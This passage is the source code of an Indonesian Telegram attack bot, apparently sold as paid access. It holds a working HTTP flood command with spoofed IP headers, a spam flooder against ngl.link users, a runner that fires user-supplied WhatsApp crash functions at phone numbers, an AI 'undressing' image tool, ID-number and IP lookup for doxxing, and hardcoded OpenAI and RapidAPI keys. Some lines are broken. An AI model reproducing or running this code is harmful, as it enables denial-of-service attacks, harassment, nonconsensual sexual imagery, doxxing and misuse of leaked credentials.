    https.get(fileLink, (response) => {
      response.pipe(fileStream)
      fileStream.on("finish", () => {
        fileStream.close()
        bot.sendMessage(chatId, `✅ ⵢ File *${fileName}* Updated !`, { parse_mode: "Markdown" })
        if (fileName === "Xzèll.js" || fileName === "package.json") {
          bot.sendMessage(chatId, `♻️ ⵢ File penting diperbarui (${fileName}) — Bot akan restart...`, { parse_mode: "Markdown" })
          setTimeout(() => {
            exec("pm2 restart all || npm restart || node Xzèll.js", (err) => {
              if (err) console.error("Gagal restart bot:", err.message)
            })
          }, 2000)
        }
      })
    }).on("error", (err) => {
      bot.sendMessage(chatId, `❌ ⵢ Gagal mengunduh file: ${err.message}`)
    })
  } catch (err) {
    bot.sendMessage(chatId, `❌ ⵢ Terjadi kesalahan: ${err.message}`)
  }
})

bot.onText(/^\/ddoswebsite(?:\s+(.+))?$/i, async (msg, match) => {
  try {
  const args = (msg.text || "").split(" ").slice(1).join(" ").trim();
    if (!args) {
      return bot.sendMessage(msg.chat.id, "❌ ⵢ Format: /ddoswebsite https://target.com 1000");
    }

    const [target_url, rawThreads] = args.split(" ");
    const threads = parseInt(rawThreads) || 50;

    const processMsg = await bot.sendMessage(msg.chat.id, `<blockquote><b>─ ¡ ᬊ Xploitify ༑ᐧ Insidious ¡ ─</b></blockquote>
┃☰. - Target
〢-╰➤ ° ↯  ${target_url}
┃☰. - Threads
〢-╰➤ ° ↯  ${threads}
┃☰. - Status
〢-╰➤ ° ↯  Process
`, { parse_mode: "HTML" });

    const attackConfig = {
      threads: threads,
      duration: 60000,
      requestsPerThread: 1000,
      userAgents: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36"
      ],
      methods: ["GET", "POST", "HEAD", "OPTIONS"]
    };

    let totalRequests = 0;
    let successfulAttacks = 0;
    const startTime = Date.now();

    const attackPromises = [];

    for (let i = 0; i < attackConfig.threads; i++) {
      attackPromises.push(new Promise(async (resolve) => {
        let threadRequests = 0;
        
        while (Date.now() - startTime < attackConfig.duration && threadRequests < attackConfig.requestsPerThread) {
          try {
            const method = attackConfig.methods[Math.floor(Math.random() * attackConfig.methods.length)];
            const userAgent = attackConfig.userAgents[Math.floor(Math.random() * attackConfig.userAgents.length)];
            const ip = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

            const headers = {
              "X-Forwarded-For": ip,
              "X-Real-IP": ip,
              "User-Agent": userAgent,
              "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
              "Accept-Language": "en-US,en;q=0.5",
              "Accept-Encoding": "gzip, deflate, br",
              "Connection": "keep-alive",
              "Upgrade-Insecure-Requests": "1",
              "Cache-Control": "no-cache",
              "Pragma": "no-cache"
            };

            const randomPaths = ["/", "/admin", "/wp-admin", "/api", "/test", "/debug"];
            const randomPath = randomPaths[Math.floor(Math.random() * randomPaths.length)];
            const attackUrl = target_url + randomPath;

            const response = await axios({
              method: method,
              url: attackUrl,
              headers: headers,
              timeout: 5000,
              validateStatus: () => true
            });

            totalRequests++;
            threadRequests++;
            
            if (response.status < 500) {
              successfulAttacks++;
            }

            if (totalRequests % 100 === 0) {
              const elapsed = Math.floor((Date.now() - startTime) / 1000);
              await bot.editMessageText(
                `<blockquote><b>─ ¡ ᬊ Xploitify ༑ᐧ Insidious ¡ ─</b></blockquote>
┃☰. - Target
〢-╰➤ ° ↯  ${target_url}
┃☰. - Threads
〢-╰➤ ° ↯  ${attackConfig.threads}
┃☰. - Requests
〢-╰➤ ° ↯  ${totalRequests}
┃☰. - Success
〢-╰➤ ° ↯  ${successfulAttacks}
┃☰. - Duration
〢-╰➤ ° ↯  ${elapsed}s
┃☰. - Status
〢-╰➤ ° ↯  Running
`,
                {
                  chat_id: msg.chat.id,
                  message_id: processMsg.message_id,
                  parse_mode: "HTML"
                }
              );
            }

            await new Promise(r => setTimeout(r, Math.random() * 100));

          } catch (error) {
            threadRequests++;
            totalRequests++;
          }
        }
        resolve();
      }));
    }

    await Promise.all(attackPromises);

    const endTime = Date.now();
    const totalDuration = Math.floor((endTime - startTime) / 1000);

    await bot.editMessageText(
      `<blockquote><b>─ ¡ ᬊ Xploitify ༑ᐧ Insidious ¡ ─</b></blockquote>
┃☰. - Target
〢-╰➤ ° ↯  ${target_url}
┃☰. - Threads
〢-╰➤ ° ↯  ${attackConfig.threads}
┃☰. - Total Requests
〢-╰➤ ° ↯  ${totalRequests}
┃☰. - Successful
〢-╰➤ ° ↯  ${successfulAttacks}
┃☰. - Total Duration
〢-╰➤ ° ↯  ${totalDuration}s
┃☰. - Requests/Sec
〢-╰➤ ° ↯  ${Math.floor(totalRequests / totalDuration)}
┃☰. - Status
〢-╰➤ ° ↯  Completed
`,
      {
        chat_id: msg.chat.id,
        message_id: processMsg.message_id,
        parse_mode: "HTML"
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, "❌ ⵢ Gagal melakukan serangan ddos" + error);
  }
});

bot.onText(/^\/broadcast(?:\s+([\s\S]+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const text = match[1];

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To dàpz. hólo</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }]
        ]
      }
    });
  }

  if (!text) {
    return bot.sendMessage(chatId, "Gunakan format:\n`/broadcast <pesan>`", { parse_mode: "Markdown" });
  }

  await bot.sendMessage(chatId, `Mengirim Pesan ke ${users.size} pengguna...`, { parse_mode: "Markdown" });

  let success = 0;
  let fail = 0;

  for (const userId of users) {
    try {
      await bot.sendMessage(userId, `
<blockquote>Broadcast From Admin [ 𖥊 ]</blockquote>
#- Message : ${text}`, { parse_mode: "HTML" });
      success++;
    } catch {
      fail++;
    }
  }

  await bot.sendMessage(chatId, `Pesan selesai!\n\nTerkirim: ${success}\nGagal: ${fail}`);
});

bot.onText(/^\/chatowner (.+)/, async (msg, match) => {
  const text = match[1];
  bot.sendMessage(OWNER_ID, "From User:\n" + text)
  bot.sendMessage(msg.chat.id, "Succes Chat Owner !.")
})

async function getFileBuffer(fileId, bot) {
  const link = await bot.getFileLink(fileId)
  const res = await axios.get(link, { responseType: "arraybuffer" })
  return Buffer.from(res.data)
}

async function getFileUrl(fileId) {
  const file = await bot.getFile(fileId)
  return `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`
}

async function downloadToFile(fileUrl, outPath) {
  const res = await axios.get(fileUrl, { responseType: "stream", timeout: 120000 })
  await streamPipeline(res.data, fs.createWriteStream(outPath))
  return outPath
}

async function downloadBuffer(fileUrl) {
  const res = await axios.get(fileUrl, { responseType: "arraybuffer", timeout: 120000 })
  return Buffer.from(res.data)
}

function tmpPath(ext = "") {
  return path.join(process.cwd(), "tmp_" + uuidv4() + (ext ? ("." + ext) : ""))
}

async function getMediaFromMessage(msg) {
  if (msg.photo) {
    const p = msg.photo[msg.photo.length - 1]
    return { type: "photo", fileId: p.file_id }
  }
  if (msg.video) {
    return { type: "video", fileId: msg.video.file_id }
  }
  if (msg.document && msg.document.mime_type && msg.document.mime_type.startsWith("image")) {
    return { type: "document", fileId: msg.document.file_id }
  }
  if (msg.reply_to_message) {
    const rm = msg.reply_to_message
    if (rm.photo) {
      const p = rm.photo[rm.photo.length - 1]
      return { type: "photo", fileId: p.file_id }
    }
    if (rm.video) {
      return { type: "video", fileId: rm.video.file_id }
    }
    if (rm.document && rm.document.mime_type && rm.document.mime_type.startsWith("image")) {
      return { type: "document", fileId: rm.document.file_id }
    }
  }
  return null
}

async function upscaleSharp(buffer, scale = 2) {
  const img = sharp(buffer)
  const meta = await img.metadata()
  const width = meta.width ? Math.round(meta.width * scale) : null
  if (!width) return null
  const out = await img.resize({ width, withoutEnlargement: false, kernel: sharp.kernel.lanczos3 }).toBuffer()
  return out
}

async function makeSticker(buffer) {
  const out = await sharp(buffer).resize(512, 512, { fit: "cover" }).webp().toBuffer()
  return out
}

async function addWatermark(buffer, text) {
  const meta = await sharp(buffer).metadata()
  const svg = `<svg width="${meta.width}" height="${meta.height}"><style>.a{fill:white;font-size:48px;font-weight:700;stroke:black;stroke-width:2px;}</style><text x="${Math.max(10, Math.floor(meta.width*0.02))}" y="${meta.height - Math.max(10, Math.floor(meta.height*0.02))}" class="a">${text}</text></svg>`
  const out = await sharp(buffer).composite([{ input: Buffer.from(svg), gravity: "southeast" }]).toBuffer()
  return out
}

function downloadFile(url, outputPath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(outputPath)
    https.get(url, (res) => {
      res.pipe(file)
      file.on("finish", () => file.close(() => resolve(true)))
    }).on("error", (err) => {
      fs.unlinkSync(outputPath)
      reject(err)
    })
  })
}

bot.on("message", async msg => {
  try {
    const chatId = msg.chat.id
    const textRaw = (msg.text || msg.caption || "").trim()
    if (!textRaw) return
    const parts = textRaw.split(" ")
    const cmd = parts[0].toLowerCase()
    const arg = parts.slice(1).join(" ").trim()
    const media = await getMediaFromMessage(msg)
    
   if (msg.text === "/removebg") {
    return bot.sendMessage(chatId, "❌ ⵢ Format : Reply Media Dengan Caption /removebg")
  }

  if (msg.photo) {
    try {
      const fileId = msg.photo[msg.photo.length - 1].file_id
      const file = await bot.getFile(fileId)

      const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`
      const inputPath = "input_removebg.png"
      const outputPath = "removebg_result.png"

      await downloadFile(fileUrl, inputPath)

      await sharp(inputPath)
        .removeAlpha()
        .threshold(200)
        .png()
        .toFile(outputPath)

      await bot.sendPhoto(chatId, outputPath, {
        caption: "✅ ⵢ Remove Bg By Dapz Exclusive ( 🍁 )"
      })

      fs.unlinkSync(inputPath)
      fs.unlinkSync(outputPath)

    } catch(e) {
      bot.sendMessage(chatId, "❌ ⵢ Terjadi error saat memproses foto." + e)
    }
  }
    if (cmd === "/sticker" || cmd === "/stiker") {
      if (!media) {
        await bot.sendMessage(chatId, "❌ ⵢ Format : Reply Media / Kirim Media Dengan Caption /sticker")
        return
      }
      const fileUrl = await getFileUrl(media.fileId)
      const buf = await downloadBuffer(fileUrl)
      const webp = await makeSticker(buf)
      await bot.sendSticker(chatId, webp)
      return
    }
    if (cmd === "/watermark" || cmd === "/wm") {
      if (!arg) {
        await bot.sendMessage(chatId, "Tambahkan teks watermark setelah perintah, contoh: /watermark zellx")
        return
      }
      if (!media) {
        await bot.sendMessage(chatId, "❌ ⵢ Format : Reply Media / Kirim Media Dengan Caption /watermark teks")
        return
      }
      const fileUrl = await getFileUrl(media.fileId)
      const buf = await downloadBuffer(fileUrl)
      const out = await addWatermark(buf, arg)
      await bot.sendPhoto(chatId, out)
      return
    }
  } catch (e) {
    try { await bot.sendMessage(msg.chat.id, "Terjadi kesalahan saat memproses") } catch {}
  }
})

const MAIN_FILE = "./Xzèll.js";

bot.onText(/^\/addfiture$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const messageId = msg.message_id;
  
  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To dàpz. hólo</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }]
        ]
      }
    });
  }

  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, "❌ ⵢ Reply ke case text atau file .js yang ingin ditambahkan.");
  }

  let newCase = "";

  if (msg.reply_to_message.text) {
    newCase = msg.reply_to_message.text;
  }

  if (msg.reply_to_message.document) {
    const file = await bot.getFile(msg.reply_to_message.document.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
    const res = await fetch(fileUrl);
    newCase = await res.text();
  }

  if (!newCase) {
    return bot.sendMessage(chatId, "❌ ⵢ Gagal mendapatkan case dari reply.");
  }

  try {
    const appendText = `\n\n${newCase}\n`;
    fs.appendFileSync(MAIN_FILE, appendText, "utf8");

    await bot.sendMessage(chatId, "✅ ⵢ Case berhasil ditambahkan ke Dapzdarkness.js!\nPlease Type /restart.", {
      reply_to_message_id: messageId
    });

  } catch (err) {
    bot.sendMessage(chatId, "⚠️ ⵢ Terjadi kesalahan: " + err.message);
  }
});

bot.onText(/^\/spamngl(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const args = match[1] ? match[1].split(" ") : [];

  try {
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Premium Acces</b>
<b>Please Buy Acces To dàpz. hólo</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }]
        ]
      }
    });
  }
  
    if (args.length < 1) {
      return bot.sendMessage(chatId, "❌ ⵢ Format: /spamngl Dapzdarkness 10");
    }

    const username = args[0];
    const amount = parseInt(args[1], 10);
    const delay = 200;

    if (isNaN(amount) || amount < 1) {
      return bot.sendMessage(chatId, "❌ ⵢ Masukkan jumlah dan harus berupa angka!");
    }

    await bot.sendMessage(chatId, `⏳ Mengirim ${amount} pesan spam ke ${username}`);

    for (let i = 1; i <= amount; i++) {
      try {
        const deviceId = crypto.randomBytes(21).toString("hex");
        const message = "Who's Dapzdarkness🤗??";
        const body = `username=${username}&question=${encodeURIComponent(message)}&deviceId=${deviceId}`;

        await fetch("https://ngl.link/api/submit", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          },
          body,
        });
      } catch (err) {
        console.error(`Error kirim ke-${i}:`, err.message);
      }

      if (i < amount) {
        if (i % 50 === 0) {
          await new Promise((r) => setTimeout(r, delay + 200));
        } else {
          await new Promise((r) => setTimeout(r, delay));
        }
      }
    }

    bot.sendMessage(chatId, `✅ ⵢ Selesai mengirim ${amount} pesan spam ke ${username}`);
  } catch (error) {
    console.error("Error utama:", error);
    bot.sendMessage(chatId, "❌ ⵢ Gagal menghubungi API, coba lagi nanti.");
  }
});

// To Naked
bot.onText(/^\/tonaked(?:\s+(.+))?/,  async (msg, match) => {
    const chatId = msg.chat.id;
    const args = match[1];
    let imageUrl = args || null;

    if (!imageUrl && msg.reply_to_message && msg.reply_to_message.photo) {
      const fileId = msg.reply_to_message.photo.pop().file_id;
      const fileLink = await bot.getFileLink(fileId);
      imageUrl = fileLink;
    }

    if (!imageUrl) {
      return bot.sendMessage(chatId, "❌  Missing Input\nExample: /tonaked (reply gambar)");
    }

    const statusMsg = await bot.sendMessage(chatId, "⏳ Memproses gambar");

    try {
      const res = await fetch(
        `https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`
      );
      const data = await res.json();
      const hasil = data.result;

      if (!hasil) {
        return bot.editMessageText(
          "❌ ⵢ Gagal memproses gambar, pastikan URL atau foto valid",
          { chat_id: chatId, message_id: statusMsg.message_id }
        );
      }

      await bot.deleteMessage(chatId, statusMsg.message_id);
      await bot.sendPhoto(chatId, hasil);
    } catch (e) {
      await bot.editMessageText("❌ ⵢ Terjadi kesalahan saat memproses gambar", {
        chat_id: chatId,
        message_id: statusMsg.message_id,
      });
    }
  });

// Test Function
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

bot.onText(/^\/update$/, async (msg) => {

  const chatId = msg.chat.id;

  if (msg.from.id != OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Khusus owner.");
  }

  const fileUrl = "https://raw.githubusercontent.com/dapp231/raa320/main/Dapzdarkness.js";
  const filePath = "./Dapzdarkness.js";

  await bot.sendMessage(chatId, "⏳ Auto Update Script Mohon Tunggu...");

  const file = fs.createWriteStream(filePath);

  https.get(fileUrl, (res) => {

    if (res.statusCode !== 200) {
      bot.sendMessage(chatId, "❌ Gagal download file update.");
      return;
    }

    res.pipe(file);

    file.on("finish", () => {
      file.close(() => {
        bot.sendMessage(chatId, "📄 File Ditemukan\n✅ Update Berhasil\n♻ Restarting bot...");
        setTimeout(() => process.exit(0), 2000);
      });
    });

  }).on("error", (err) => {
    console.log(err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat update.");
  });

});

bot.onText(/^\/testfunction(?:\s+(.+))?/, async (msg, match) => {
  if (!premiumUsers.some(user => user.id === msg.chat.id && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(msg.chat.id, imageThumbnail, {
      caption: `
<b>Premium Acces</b>
<b>Please Buy Acces To dàpz. hólo</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- dàpz. hólo ¡", url: "https://t.me/susudancow17" }]
        ]
      }
    });
  }
  
    try {
      const chatId = msg.chat.id;
      const args = msg.text.split(" ");
      if (args.length < 3)
        return bot.sendMessage(chatId, "❌ ⵢ Format :  /testfunction 62××× 10 (reply function)");

      const q = args[1];
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));
      if (isNaN(jumlah) || jumlah <= 0)
        return bot.sendMessage(chatId, "❌ ⵢ Jumlah harus angka");

      if (!msg.reply_to_message || !msg.reply_to_message.text)
        return bot.sendMessage(chatId, "❌ ⵢ Reply dengan function");
        
      const processMsg = await bot.sendPhoto(chatId, imageThumbnail, {
        caption: `<blockquote><b>¡ ᬊ Xploitify ༑ᐧ Insidious ¡</b></blockquote>
⚚. ターゲット : ${q}
⚚. タイプ バグ : Uknown Function 
⚚. バグステータス : Proccesing`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cek [ ⚚ ] Target", url: `https://wa.me/${q}` }],
          ],
        },
      });

      const safeSock = createSafeSock(sock)
      const funcCode = msg.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return bot.sendMessage("❌ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote><b>¡ ᬊ Xploitify ༑ᐧ Insidious ¡</b></blockquote>
⚚. ターゲット : ${q}
⚚. タイプ バグ : Uknown Function 
⚚. バグステータス : Succes`;

      try {
        await bot.editMessageCaption(finalText, {
          chat_id: chatId,
          message_id: processMsg.message_id,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "Cek [ ⚚ ] Target", url: `https://wa.me/${q}` }],
            ],
          },
        });
      } catch (e) {
        await bot.sendPhoto(chatId, imageThumbnail, {
          caption: finalText,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "Cek [ ⚚ ] Target", url: `https://wa.me/${q}` }],
            ],
          },
        });
      }
    } catch (err) {
      console.log(err);
    }
  });

const openaiKey = "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";
const openai = new OpenAI({ apiKey: openaiKey });
bot.onText(/^\/fixcode(.*)/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const userExplanation = match[1]?.trim() || "(no explanation provided)";

    // Pastikan reply ke pesan lain
    if (!msg.reply_to_message) {
      return bot.sendMessage(chatId,
        "❌ ⵢ Format : Reply Code With Command /fixcode"
      );
    }

    let code = "";
    let filename = "fixed.js";
    let lang = "JavaScript";

    const reply = msg.reply_to_message;

    if (reply.document) {
      const fileId = reply.document.file_id;
      const file = await bot.getFile(fileId);
      const fileLink = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
      const response = await axios.get(fileLink);
      code = response.data;
      filename = reply.document.file_name || "fixed.js";

      if (filename.endsWith(".php")) lang = "PHP";
      else if (filename.endsWith(".py")) lang = "Python";
      else if (filename.endsWith(".html") || filename.endsWith(".htm")) lang = "HTML";
      else if (filename.endsWith(".css")) lang = "CSS";
      else if (filename.endsWith(".json")) lang = "JSON";
      else lang = "JavaScript";

    // === Jika reply text ===
    } else if (reply.text) {
      code = reply.text;
    } else {
      return bot.sendMessage(chatId, "❌ ⵢ Balas ke pesan teks atau file kode.");
    }

    await bot.sendMessage(chatId, "🛠️ ⵢ Process Check & Fix Code");

    const completion = await openai.chat.completions.create({
      model: "gpt-4o-mini",
      messages: [
        {
          role: "system",
          content:
            "Kamu hanya boleh memperbaiki error dalam kode dan merapikan format. " +
            "Berikan penjelasan error dan solusi, lalu tampilkan kode hasil perbaikan tanpa code block. " +
            "Format: ANALYSIS:[penjelasan] CODE:[kode hasil]"
        },
        {
          role: "user",
          content:
            userExplanation === "(no explanation provided)"
              ? `Perbaiki error dan rapikan format kode ${lang} ini:\n${code}`
              : `Perbaiki error dan rapikan format kode ${lang} ini berdasarkan penjelasan:\n${code}\n\nPenjelasan:\n${userExplanation}`
        }
      ]
    });

    const result = completion.choices[0].message.content;

    // === Pisahkan ANALYSIS dan CODE ===
    const analysisMatch = result.match(/ANALYSIS:\s*([\s\S]*?)(?=CODE:|$)/i);
    const codeMatch = result.match(/CODE:\s*([\s\S]*?)$/i);
    const explanation = analysisMatch ? analysisMatch[1].trim() : "Tidak ada analisis spesifik.";
    const fixedCode = codeMatch ? codeMatch[1].trim() : result.trim();

    // === Kirim hasil analisis ===
    const header = `
<pre>¡ ᬊ Xploitify ༑ᐧ Insidious ¡ᐧ</pre>
<b>( 🛠️ ) Code Fix Result</b>
<b>Language:</b> ${lang}
<b>User Explanation:</b> ${userExplanation}
<b>Error Analysis:</b>
${explanation}

<b>© ⚊ dàpz. hólo - ¿?</b>
`;

    await bot.sendMessage(chatId, header, { parse_mode: "HTML" });

    const tempDir = "./temp";
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

    const tempFilePath = `./temp/fixed_${Date.now()}_${filename}`;
    fs.writeFileSync(tempFilePath, fixedCode);

    await bot.sendDocument(chatId, tempFilePath, {}, {
      filename: `Fixed_${filename}`
    });

    fs.unlinkSync(tempFilePath);

    console.log(chalk.green(`✅ ⵢ Code fix completed for user ${senderId}`));

  } catch (error) {
    console.error(chalk.red(`❌ ⵢ Fixcode error: ${error.message}`));
    await bot.sendMessage(msg.chat.id,
      `❌ ⵢ Failed to fix code: ${error.message}\n\nPlease try again or contact support.`
    );
  }
});

bot.onText(/^\/nikparse(?:\s+(.+))?$/i, async (msg, match) => {
  const args = (match[1] || "").split(" ");
  const nik = args[0];

  if (!nik) {
    return bot.sendMessage(msg.chat.id, "❌ ⵢ Format : /nikparse 3510243006730004");
  }

  try {
    const waitMsg = await bot.sendMessage(msg.chat.id, "Process Search NIK...");

    const response = await axios.get(
      `https://nik-parser.p.rapidapi.com/ektp?nik=${nik}`,
      {
        headers: {
          'x-rapidapi-host': 'nik-parser.p.rapidapi.com',
          'x-rapidapi-key': '972f5c568dmsh552ff4877326665p1b6e67jsn290d2652a173'
        },
        timeout: 15000
      }
    );

    const result = response.data;

    try {
      await bot.deleteMessage(msg.chat.id, waitMsg.message_id);
    } catch (e) {}

    if (result.errCode !== 0) {
      return bot.sendMessage(msg.chat.id, `Gagal parsing NIK: ${result.errMessage || 'Unknown error'}`);
    }

    const data = result.data;

    let caption = `<blockquote><b>¡ ᬊ Xploitify ༑ᐧ Insidious ¡</b></blockquote>\n\n`;
    caption += `┃☰. - NIK: ${nik}\n\n`;
    caption += `〢-╰➤ ° ↯ Provinsi: ${data.province || 'Tidak diketahui'}\n`;
    caption += `┃☰. - Kota/Kab: ${data.city || 'Tidak diketahui'}\n`;
    caption += `〢-╰➤ ° ↯ Kecamatan: ${data.district || 'Tidak diketahui'}\n`;
    caption += `┃☰. - Kode Pos: ${data.zipcode || 'Tidak diketahui'}\n\n`;
    caption += `〢-╰➤ ° ↯ Jenis Kelamin: ${data.gender || 'Tidak diketahui'}\n`;
    caption += `┃☰. - Tanggal Lahir: ${data.birthdate || 'Tidak diketahui'}\n`;
    caption += `〢-╰➤ ° ↯ Uniq Code: ${data.uniqcode || 'Tidak diketahui'}`,
       { parse_mode: "HTML" }
       await bot.sendMessage(msg.chat.id `${caption}`);

  } catch (error) {
    console.error('NIK Parse error:', error.response?.data || error.message);
    
    let errorMessage = 'Gagal parsing NIK\n\n';
    
    if (error.response) {
      if (error.response.status === 400) {
        errorMessage += 'NIK tidak valid';
      } else {
        errorMessage += `Status: ${error.response.status}`;
      }
    } else if (error.code === 'ECONNABORTED') {
      errorMessage += 'Timeout: Request terlalu lama';
    } else {
      errorMessage += `Error: ${error.message}`;
    }
    
    await bot.sendMessage(msg.chat.id, `${errorMessage}`);
  }
});

bot.onText(/^\/trackip(?:\s+(.+))?/,  async (msg, match) => {
    const chatId = msg.chat.id;
    const args = msg.text.split(" ").filter(Boolean);
    if (!args[1]) return bot.sendMessage(chatId, "❌ ⵢ Missing Input\nExample: /trackip 8.8.8.8");

    const ip = args[1].trim();

    function isValidIPv4(ip) {
      const parts = ip.split(".");
      if (parts.length !== 4) return false;
      return parts.every((p) => {
        if (!/^\d{1,3}$/.test(p)) return false;
        if (p.length > 1 && p.startsWith("0")) return false;
        const n = Number(p);
        return n >= 0 && n <= 255;
      });
    }

    function isValidIPv6(ip) {
      const ipv6Regex =
        /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
      return ipv6Regex.test(ip);
    }

    if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
      return bot.sendMessage(
        chatId,
        "❌ ⵢ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar"
      );
    }

    const processingMsg = await bot.sendMessage(
      chatId,
      `🔎 ⵢ Tracking IP ${ip} — sedang memproses`
    );
         
    try {
      const res = await axios.get(
        `https://ipwhois.app/json/${encodeURIComponent(ip)}`,
        { timeout: 10000 }
      );
      const data = res.data;

      if (!data || data.success === false) {
        return bot.sendMessage(chatId, `❌ ⵢ Gagal mendapatkan data untuk IP: ${ip}`);
      }

      const lat = data.latitude || "";
      const lon = data.longitude || "";
      const mapsUrl =
        lat && lon
          ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(
              lat + "," + lon
            )}` : null;

      const caption = `
<blockquote><b>─ ¡ ᬊ Xploitify ༑ᐧ Insidious ¡ ─</b></blockquote>
┃☰. - IP: ${data.ip || "-"}
〢-╰➤ ° ↯ Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
┃☰. - Region: ${data.region || "-"}
〢-╰➤ ° ↯ City: ${data.city || "-"}
┃☰. - ZIP: ${data.postal || "-"}
〢-╰➤ ° ↯ Timezone: ${data.timezone_gmt || "-"}
┃☰. - ISP: ${data.isp || "-"}
〢-╰➤ ° ↯ Org: ${data.org || "-"}
┃☰. - ASN: ${data.asn || "-"}
〢-╰➤ ° ↯ Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

      const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🌍 ⵢ Location", url: mapsUrl }]
        ]
      }
    } : null;

      try {
      if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
        await bot.editMessageText(
          processingMsg.chat.id,
          processingMsg.message_id,
          undefined,
          caption,
          { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
        );
      } else if (typeof imageThumbnail !== "undefined" && imageThumbnail) {
        await bot.sendPhoto(imageThumbnail, {
          caption,
          parse_mode: "HTML",
          ...(inlineKeyboard ? inlineKeyboard : {})
        });
      } else {
        if (inlineKeyboard) {
          await bot.sendMessage(msg.chat.id, caption, { parse_mode: "HTML", ...inlineKeyboard });
        } else {
          await bot.sendMessage(msg.chat.id, caption, { parse_mode: "HTML" });
        }
      }
    } catch (e) {
      console.log(e)
    }

  } catch (err) {
